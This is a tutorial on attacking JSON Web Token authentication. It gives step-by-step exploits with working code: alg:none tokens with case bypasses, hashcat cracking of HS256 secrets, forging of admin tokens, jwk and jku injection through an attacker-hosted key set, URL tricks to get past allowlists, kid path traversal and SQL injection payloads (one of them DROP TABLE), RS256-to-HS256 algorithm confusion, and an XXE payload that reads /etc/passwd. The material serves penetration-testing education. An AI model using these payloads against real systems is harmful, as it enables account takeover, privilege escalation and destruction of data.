# JWT Attacks

JSON Web Tokens underpin authentication and access control on millions of websites — and their security rests entirely on one assumption: that the signature is properly verified. When that assumption breaks (through missing verification, algorithm confusion, or key injection), an attacker can forge arbitrary tokens, impersonate any user, and escalate to admin-level access. Unlike session cookies stored server-side, JWTs are entirely client-side — the server has no stored copy to compare against, so a forged but correctly-signed token is indistinguishable from a legitimate one. 

**Fundamental principle: Every JWT attack is ultimately about making the server accept a token it should reject — either by bypassing signature verification entirely (the server never checks it), substituting the verification key (the attacker controls which key is used), or weakening the algorithm (the secret can be derived or the signing key is public).**

***

## JWT Structure and Anatomy

```
A JWT consists of three Base64URL-encoded sections separated by dots:
─────────────────────────────────────────────────────────────────────────────
eyJraWQiOiI5MTM2ZGRiMyIsImFsZyI6IlJTMjU2In0   ← HEADER
.
eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImNhcmxvcyIsInJvbGUiOiJibG9nX2F1dGhvciJ9
                                                 ← PAYLOAD
.
SYZBPIBg2CRjXAJ8vCER0LA_ENjII1Ja...            ← SIGNATURE

IMPORTANT: Base64URL ≠ Base64
  Base64URL replaces: + → -    / → _    and strips trailing =
  Anyone can decode header/payload — they are NOT encrypted, only encoded.
  Security comes ENTIRELY from the signature, not the encoding.

─────────────────────────────────────────────────────────────────────────────
HEADER (decoded):
{
    "kid": "9136ddb3-cb0a-4a19-a07e-eadf5a44c8b5",  ← Key ID: which key to use
    "alg": "RS256",                                  ← algorithm: RS256, HS256, none...
    "typ": "JWT",                                    ← type
    "jwk": {...},                                    ← optional: embedded public key
    "jku": "https://...",                            ← optional: URL to fetch key from
    "x5c": [...]                                     ← optional: X.509 cert chain
}

PAYLOAD (decoded) — the "claims":
{
    "iss": "portswigger",         ← issuer: who created the token
    "sub": "carlos",              ← subject: who the token is about (user ID)
    "exp": 1648037164,            ← expiry: Unix timestamp
    "iat": 1516239022,            ← issued-at: Unix timestamp
    "name": "Carlos Montoya",
    "role": "blog_author",        ← custom claim: used for access control ← ATTACK TARGET
    "email": "carlos@carlos-montoya.net",
    "isAdmin": false              ← custom claim: used for privilege check ← ATTACK TARGET
}

SIGNATURE (for HS256):
  HMAC-SHA256(
      base64url(header) + "." + base64url(payload),
      SECRET_KEY
  )

SIGNATURE (for RS256):
  RSA-SHA256(
      base64url(header) + "." + base64url(payload),
      PRIVATE_KEY      ← server signs with private key
  )
  → Verified with PUBLIC KEY
  → Attacker needs private key to forge; public key is OK to be known

─────────────────────────────────────────────────────────────────────────────
JWS vs JWE vs JWT:
  JWT  = the outer format specification (just defines the claims structure)
  JWS  = JWT + cryptographic SIGNATURE  ← what everyone calls "a JWT" in practice
  JWE  = JWT + ENCRYPTION (payload is encrypted, not just encoded)
         → Different header, different structure, different attack surface
  "JWT attack" throughout this guide = attacks on JWS tokens
```

***

## Attack 1: Unverified Signature (Developer Uses `decode()` Instead of `verify()`)

```javascript
// ── THE VULNERABILITY: decode() vs verify() confusion ────────────────────────

// WRONG (vulnerable — only decodes, NEVER checks signature):
const decoded = jwt.decode(token);                    // ← just Base64URL decodes it
const username = decoded.username;                    // ← trusts decoded data directly
// Attacker can modify any claim; server accepts it unconditionally ✓

// CORRECT:
const decoded = jwt.verify(token, SECRET_KEY);        // ← verifies signature first
// If signature invalid → throws JsonWebTokenError → request rejected ✓

// Libraries where this confusion commonly occurs:
// Node.js:   jsonwebtoken  →  .verify()  vs  .decode()
// Python:    PyJWT         →  .decode(verify=True)  vs  .decode(verify=False)
// Java:      jjwt          →  .parseClaimsJws()  vs  .parseClaimsJwt()
// PHP:       firebase/php-jwt → JWT::decode() (always verifies if key provided)
```

```
ATTACK STEPS:
─────────────────────────────────────────────────────────────────────────────
1. Obtain your own valid JWT from the application (log in normally).

2. In Burp Suite:
   - Open the JWT in the JSON Web Token tab (JWT Editor extension)
   - OR manually decode: split on ".", Base64URL-decode each part

3. Modify the payload:
   {"sub": "carlos", "role": "blog_author"}
   →
   {"sub": "administrator", "role": "admin", "isAdmin": true}

4. Re-encode (Base64URL) the modified payload.

5. Keep the ORIGINAL signature (or replace with any garbage — doesn't matter
   if the server never checks it).

6. Reconstruct the token: modified_header.modified_payload.original_signature

7. Send to the server.

8. Vulnerable server: calls decode() → reads "administrator" → grants access ✓
   Secure server:     calls verify() → signature mismatch → 401 Unauthorized ✗

Tip in Burp JWT Editor:
  → JSON Web Token tab → modify payload → click "Sign" → select "Don't modify"
  → OR simply edit the payload and send without re-signing
  → If the server returns a 200 with modified claims → unverified signature confirmed ✓
```

***

## Attack 2: `alg: none` — No Signature Required

The JWT specification allows `"alg": "none"` to indicate an "unsecured JWT" — a token with no signature. Most servers block this explicitly, but the filter is usually a simple string check that can be bypassed with case variation or encoding tricks. 

```
JWT format with alg:none — the signature section is an EMPTY STRING after the dot:

VULNERABLE FORMAT:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0   ← {"alg":"none","typ":"JWT"}
.
eyJzdWIiOiJhZG1pbmlzdHJhdG9yIiwiaXNBZG1pbiI6dHJ1ZX0  ← {"sub":"administrator","isAdmin":true}
.                                                        ← EMPTY (no signature)
[note: trailing dot REQUIRED — payload must still be terminated with "."]

─────────────────────────────────────────────────────────────────────────────
BYPASS TECHNIQUES when server naively checks for "none":
─────────────────────────────────────────────────────────────────────────────
"alg": "none"       ← exact match — most filters catch this
"alg": "None"       ← capitalised N — bypasses case-sensitive filter ✓
"alg": "NONE"       ← all caps ✓
"alg": "nOnE"       ← mixed case ✓
"alg": "none "      ← trailing space ✓
"alg": "none\t"     ← tab character ✓
"alg": "none\n"     ← newline ✓
"alg": ""           ← empty string (some libraries treat as "none") ✓
"alg": null         ← null value in JSON ✓

─────────────────────────────────────────────────────────────────────────────
STEP-BY-STEP EXPLOITATION:
─────────────────────────────────────────────────────────────────────────────

Step 1: Obtain your valid token and decode all three parts.
  Original header:  {"alg":"RS256","typ":"JWT"}
  Original payload: {"sub":"wiener","isAdmin":false}

Step 2: Modify the header:
  {"alg":"none","typ":"JWT"}
  → Base64URL encode: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

Step 3: Modify the payload:
  {"sub":"administrator","isAdmin":true}
  → Base64URL encode: eyJzdWIiOiJhZG1pbmlzdHJhdG9yIiwiaXNBZG1pbiI6dHJ1ZX0

Step 4: Construct final token (NO signature, just a trailing dot):
  eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
  .eyJzdWIiOiJhZG1pbmlzdHJhdG9yIiwiaXNBZG1pbiI6dHJ1ZX0
  .

Step 5: Send in the Authorization header:
  Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiO...

Step 6: Try variations if "none" is rejected:
  Replace "none" → "None", "NONE", "nOnE" in the Base64URL-encoded header.

Vulnerable server: strips signature section, sees valid JSON, accepts token ✓
```

```python
# ── MANUAL TOKEN CONSTRUCTION (Python) ───────────────────────────────────────
import base64, json

def base64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = {"alg": "None", "typ": "JWT"}           # capitalised bypass
payload = {"sub": "administrator", "isAdmin": True, "exp": 9999999999}

h = base64url_encode(json.dumps(header, separators=(',',':')).encode())
p = base64url_encode(json.dumps(payload, separators=(',',':')).encode())

token = f"{h}.{p}."     # trailing dot — empty signature
print(token)
```

***

## Attack 3: Brute-Forcing HS256 Secret Keys

HS256 (HMAC-SHA256) uses a single shared secret for both signing and verification. If that secret is weak, default, or taken from a public code snippet, it can be recovered offline in seconds using hashcat against a wordlist of known JWT secrets. 

```bash
# ── HASHCAT: Offline HS256 Secret Brute-Force ─────────────────────────────────
# Mode 16500 = JWT (HMAC variants: HS256, HS384, HS512)
# -a 0 = dictionary attack (wordlist mode)

# The JWT must be complete (header.payload.signature) — copy exactly from Burp
JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJsb3MiLCJyb2xlIjoiYmxvZ19hdXRob3IifQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4"

# Wordlist: well-known JWT secrets (17,000+ entries)
# Source: https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list
WORDLIST="jwt.secrets.list"

# Run hashcat:
hashcat -a 0 -m 16500 "$JWT" "$WORDLIST"

# Output format on success:
# eyJhbGci...<full JWT>:secret123
#                         ↑ discovered secret key ✓

# If already ran once, add --show to display cached result:
hashcat -a 0 -m 16500 "$JWT" "$WORDLIST" --show

# For longer targeted attacks (mask/rule-based):
hashcat -a 3 -m 16500 "$JWT" "?l?l?l?l?l?l?l?l"  # 8-char lowercase brute-force
hashcat -a 0 -m 16500 "$JWT" "$WORDLIST" -r best64.rule  # with rules

# Common weak secrets found in real applications:
# "secret"         "password"       "123456"          "jwt_secret"
# "your-256-bit-secret"             "mysecretkey"     "development"
# "change_this_secret"              "supersecret"     ""  (empty string)
# Framework defaults:
# Express JWT:  "secret"
# Django:       often derived from DEBUG=True SECRET_KEY values
# Laravel:      "base64:..." default APP_KEY in early versions
```

```python
# ── USING THE DISCOVERED SECRET: Forge any token ─────────────────────────────
import jwt   # pip install PyJWT

discovered_secret = "secret123"   # recovered from hashcat

# Forge a new token as administrator:
forged_token = jwt.encode(
    {
        "sub": "administrator",
        "role": "admin",
        "isAdmin": True,
        "iss": "portswigger",
        "exp": 9999999999
    },
    discovered_secret,
    algorithm="HS256"
)

print(forged_token)
# → Valid, server-accepted JWT with arbitrary claims ✓
```

***

## Attack 4: `jwk` Header Injection (Self-Signed Key Embedded in Token)

The JWS spec allows embedding a public key directly inside the JWT header via the `jwk` parameter. Misconfigured servers that verify signatures using any key in the `jwk` header — rather than a trusted whitelist — will accept tokens signed with an attacker's own RSA key. 

```
Attack principle:
─────────────────────────────────────────────────────────────────────────────
Normal RS256 verification:
  1. Server receives JWT
  2. Server looks up its own stored public key (hardcoded or from trusted JWKS)
  3. Verifies: RSA-SHA256(header.payload, stored_public_key) == signature ✓

Vulnerable jwk injection:
  1. Server receives JWT with "jwk" in header
  2. Server extracts the jwk from the header itself
  3. Uses the attacker-provided key to verify: signature == expected ✓
  → Attacker signs with their own private key → embeds their public key → server verifies ✓

─────────────────────────────────────────────────────────────────────────────
EXPLOITATION STEPS (Burp Suite JWT Editor Extension):
─────────────────────────────────────────────────────────────────────────────
1. Install JWT Editor extension (BApp Store)
2. Navigate to "JWT Editor Keys" tab → "New RSA Key" → Generate (2048 bit)
3. Capture a request containing your JWT in Burp Proxy → Send to Repeater
4. In Repeater: click the "JSON Web Token" tab
5. Modify the payload claims (e.g., "sub": "administrator")
6. Click "Attack" → "Embedded JWK"
7. Select your newly generated RSA key when prompted
8. Extension automatically:
   a. Signs the modified token with your RSA PRIVATE key
   b. Embeds your RSA PUBLIC key in the "jwk" header parameter
   c. Updates the "kid" to match your key's ID
9. Send the request → if server uses embedded jwk: 200 OK as administrator ✓
```

```json
// ── RESULTING TOKEN HEADER (after jwk injection) ─────────────────────────────
{
    "kid": "attacker-key-id-12345",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "attacker-key-id-12345",
        "n": "pjdss8ZaDfEH6K6U7GeW2nxDqR4IP049fk1fK0lndimbMMVBdPv_hSpm8T8EtBDxrUdi1OHZfMhUixGyvJ2gCQh4jHAA..."
    }
}
// Payload: {"sub": "administrator", "isAdmin": true, ...}
// Signature: signed with the attacker's RSA PRIVATE key
// Server verifies with the embedded PUBLIC key → verification passes ✓
```

***

## Attack 5: `jku` Header Injection (External Key Set URL)

Instead of embedding the key inline, `jku` provides a URL from which the server fetches a JWK Set to find the verification key. If the server fetches from any `jku` URL without domain validation, the attacker hosts their own JWKS and points the token at it. 

```
Attack flow:
─────────────────────────────────────────────────────────────────────────────
1. Attacker generates an RSA key pair (private + public)
2. Hosts a valid JWKS file on their own server:
   GET https://attacker-website.com/malicious-jwks.json

   Response:
   {
       "keys": [
           {
               "kty": "RSA",
               "e": "AQAB",
               "kid": "attacker-key-id",
               "n": "pjdss8ZaDfEH6K6U7GeW2nxDqR4IP049..."    ← attacker's public key
           }
       ]
   }

3. Forges a JWT:
   Header:  {"alg":"RS256","kid":"attacker-key-id",
             "jku":"https://attacker-website.com/malicious-jwks.json"}
   Payload: {"sub":"administrator","isAdmin":true}
   Signed with attacker's RSA PRIVATE key ✓

4. Sends forged JWT to the application.

5. Vulnerable server:
   a. Reads "jku": "https://attacker-website.com/malicious-jwks.json"
   b. Makes GET request to attacker's server → fetches JWKS
   c. Finds key with kid="attacker-key-id" → uses attacker's public key
   d. Verifies signature: RSA-SHA256(header.payload, attacker_public_key) == sig ✓
   e. Accepts token → administrator access granted ✓

─────────────────────────────────────────────────────────────────────────────
BYPASSING jku DOMAIN ALLOWLISTING:
─────────────────────────────────────────────────────────────────────────────
If the server checks that jku starts with a trusted domain (e.g., "https://trusted-app.com"):

Technique 1: URL credential (userinfo) injection
  "jku": "https://trusted-app.com@attacker-website.com/jwks.json"
  → Browser/curl parses "trusted-app.com" as userinfo (username)
  → Actual host is "attacker-website.com" ✓

Technique 2: Fragment injection
  "jku": "https://trusted-app.com/endpoint#attacker-website.com/jwks.json"
  → Fragment (#) is ignored by HTTP servers
  → Depending on parser: trusted-app.com receives request (and may redirect?) ✓

Technique 3: Subdomain DNS abuse
  Register: trusted-app.com.attacker-website.com
  "jku": "https://trusted-app.com.attacker-website.com/jwks.json"
  → Passes startsWith("https://trusted-app.com") check ✓

Technique 4: Open redirect chain
  "jku": "https://trusted-app.com/redirect?url=https://attacker-website.com/jwks.json"
  → Server fetches trusted-app.com/redirect → 302 → attacker-website.com/jwks.json ✓

Technique 5: SSRF chaining
  If the target has a known SSRF endpoint on the trusted domain:
  "jku": "https://trusted-app.com/fetch?url=https://attacker.com/jwks.json"
  → SSRF on trusted domain used to proxy the key fetch ✓

Technique 6: HTTP parameter pollution
  "jku": "https://trusted-app.com/jwks.json?x=https://attacker.com/jwks.json"
  → If some URL parsers take the last "url" parameter ✓
```

***

## Attack 6: `kid` Header Injection

The `kid` (Key ID) parameter tells the server which key to use for signature verification. If the server uses `kid` to locate a key on the filesystem or in a database without sanitisation, it becomes a directory traversal or SQL injection vector. 

### Path Traversal → `/dev/null` (Empty Key)

```json
// ── ATTACK: Force server to use /dev/null as the signing key ──────────────────
// /dev/null on Linux = an empty file → reading returns empty string ""
// If server signs with key = contents of kid file:
//   sign(header.payload, "") → a valid HS256 signature using empty string as secret
// Attacker knows the key ("") → can forge any token ✓

// Modified JWT header:
{
    "kid": "../../../dev/null",      ← path traversal to /dev/null
    "alg": "HS256",
    "typ": "JWT"
}

// Attacker signs their forged token with EMPTY STRING as the HS256 secret:
import jwt
forged = jwt.encode(
    {"sub": "administrator", "isAdmin": True},
    "",           ← empty string = contents of /dev/null ✓
    algorithm="HS256",
    headers={"kid": "../../../dev/null"}
)
```

```
Path traversal variations to try:
─────────────────────────────────────────────────────────────────────────────
"kid": "../../../dev/null"          ← standard Linux null device (empty key)
"kid": "../../dev/null"             ← fewer traversal steps
"kid": "/dev/null"                  ← absolute path (if server joins naively)
"kid": "....//....//dev/null"       ← double-dot slash bypass (some filters)
"kid": "..%2F..%2F..%2Fdev%2Fnull" ← URL-encoded traversal
"kid": "../../etc/passwd"           ← if you know a line in /etc/passwd (predictable content)
"kid": "../../var/www/html/favicon.ico"  ← static file with known bytes
"kid": "../../app/static/logo.png"  ← any static asset whose bytes you can read

Steps for non-empty known file:
  1. Fetch the file content via the app (e.g., GET /static/logo.png → download)
  2. Use the raw bytes of that file as the HS256 secret
  3. Sign forged token with those bytes as the key
  4. Set kid to traverse to that file
  5. Server reads the file → same bytes → signature matches ✓
```

### SQL Injection via `kid`

```sql
-- ── VULNERABILITY: Server queries database for the key ────────────────────────
-- Server code (vulnerable):
SELECT key_value FROM signing_keys WHERE key_id = '<kid_value>'

-- Normal request: kid = "key1"
SELECT key_value FROM signing_keys WHERE key_id = 'key1'
-- Returns: "supersecretkey123"

-- ── ATTACK: Inject a UNION to control the returned key value ──────────────────
-- Attacker sets kid to:
-- 1' UNION SELECT 'attacker_controlled_key'--

-- Resulting query:
SELECT key_value FROM signing_keys WHERE key_id = '1' UNION SELECT 'attacker_controlled_key'--'
-- Returns: "attacker_controlled_key"  ← attacker-controlled ✓

-- Attacker signs the forged JWT with "attacker_controlled_key" as the HS256 secret:
import jwt
forged = jwt.encode(
    {"sub": "administrator", "isAdmin": True},
    "attacker_controlled_key",
    algorithm="HS256",
    headers={"kid": "1' UNION SELECT 'attacker_controlled_key'--"}
)
-- Server queries → gets "attacker_controlled_key" → verifies with that → matches ✓

-- Alternative: return NULL/empty to get empty-key attack:
-- kid = "nonexistent' OR '1'='1
-- Returns first key in table — if predictable, attacker can sign with it ✓

-- More destructive injections (if applicable):
-- kid = "1'; DROP TABLE signing_keys;--"   ← destructive (avoid in pentests)
-- kid = "1' AND 1=2 UNION SELECT user()--" ← extract DB metadata ✓
```

***

## Attack 7: Algorithm Confusion (RS256 → HS256)

This is the most subtle and powerful JWT attack. When a server uses RS256 (asymmetric — signs with private key, verifies with public key), some libraries' `verify()` function accept the algorithm from the token header. An attacker changes the algorithm to HS256 (symmetric — signs and verifies with the same secret) and signs the token using the server's *public key* as the HMAC secret. The server then uses its public key (thinking it's an HMAC secret) to verify — and it matches. 

```
─────────────────────────────────────────────────────────────────────────────
WHAT MAKES THIS WORK:
─────────────────────────────────────────────────────────────────────────────
Normal RS256 verification:
  server_code: verify(token, public_key)   ← public_key used as RSA verification key

Attacker changes alg to HS256:
  server_code: verify(token, public_key)   ← SAME call, SAME public_key argument
  BUT: library now interprets public_key as the HMAC shared secret (not RSA key)
  → Verifies: HMAC-SHA256(header.payload, public_key_bytes) == signature
  → Attacker has the public key (it's PUBLIC) → can compute the same HMAC ✓

REQUIRED PRECONDITION:
  ① The library does NOT enforce that alg matches a configured expected algorithm
  ② The server's public key is accessible (from /jwks.json, x.509 cert, or response header)
  → Exposed public keys are not normally a problem for RSA — but they are for this attack

─────────────────────────────────────────────────────────────────────────────
EXPLOITATION STEPS:
─────────────────────────────────────────────────────────────────────────────
Step 1: Obtain the server's RSA public key
  Method A: fetch /.well-known/jwks.json → extract "n" and "e" values
  Method B: fetch /.well-known/openid-configuration → follow jwks_uri
  Method C: extract from a valid RS256 JWT using Burp JWT Editor:
            JWT Editor Keys → New RSA Key → paste the JWK from the server

Step 2: Convert the public key to PEM format (needed for HMAC secret)
  Using JWT Editor: right-click key → "Copy Public Key as PEM"
  Result (example):
  -----BEGIN PUBLIC KEY-----
  MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAp...
  -----END PUBLIC KEY-----

Step 3: Base64-encode the PEM (the HMAC secret must be the raw bytes)
  import base64
  pem = b"-----BEGIN PUBLIC KEY-----\nMIIBIjAN...\n-----END PUBLIC KEY-----\n"
  b64_pem = base64.b64encode(pem).decode()
  # → "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5C..."

Step 4: In Burp JWT Editor Keys:
  → New Symmetric Key → Generate → replace "k" value with b64_pem from Step 3

Step 5: In JWT Repeater tab:
  → Modify header: "alg": "HS256"  (was "RS256")
  → Modify payload: "sub": "administrator", "isAdmin": true
  → Click Sign → select your symmetric key → select "Don't modify header"
  → Send the request

Step 6: Vulnerable server: reads "alg":"HS256" from header → uses its RSA public key
        as HMAC secret → HMAC-SHA256(header.payload, public_key) == your signature ✓
        → Access granted as administrator ✓
```

```python
# ── MANUAL ALGORITHM CONFUSION (Python) ──────────────────────────────────────
import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

# Server's public key (obtained from /jwks.json, converted to PEM)
server_public_key_pem = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAp...
-----END PUBLIC KEY-----"""

# The public key bytes are used as the HS256 secret:
# CRITICAL: must match EXACTLY what the server uses (same PEM format, same line endings)
forged_token = jwt.encode(
    {"sub": "administrator", "isAdmin": True, "exp": 9999999999},
    server_public_key_pem,      ← public key AS the HMAC secret ✓
    algorithm="HS256"
)
print(forged_token)
```

***

## Other Exploitable Header Parameters

```
─────────────────────────────────────────────────────────────────────────────
cty (Content Type) — Secondary Attack Vector After Signature Bypass
─────────────────────────────────────────────────────────────────────────────
Normally absent. If you can bypass signature verification AND inject cty:

"cty": "text/xml"
  → Some JWT libraries pass the payload to an XML parser
  → XXE injection possible if payload contains: <?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>

"cty": "application/x-java-serialized-object"
  → Java applications: payload passed to Java deserialization
  → RCE possible via gadget chains (ysoserial)

"cty": "application/x-www-form-urlencoded"
  → Payload treated as form data
  → May bypass filters that only check JSON content

─────────────────────────────────────────────────────────────────────────────
x5c (X.509 Certificate Chain)
─────────────────────────────────────────────────────────────────────────────
Used like jwk but with an X.509 certificate instead of a raw JWK:
  → Server extracts public key from the first certificate in the chain
  → If server doesn't validate the certificate against a trusted CA:
    Attacker generates a self-signed certificate with their own key pair
    Embeds it in x5c → server uses attacker's public key for verification
    Attacker signs with their own private key → verification passes ✓

  → X.509 parsing complexity → additional vulnerabilities:
    CVE-2017-2800: Apple's Security framework — heap corruption in cert parsing
    CVE-2018-2633: Java — LDAP/JNDI injection via SubjectAlternativeName in x5c cert
```
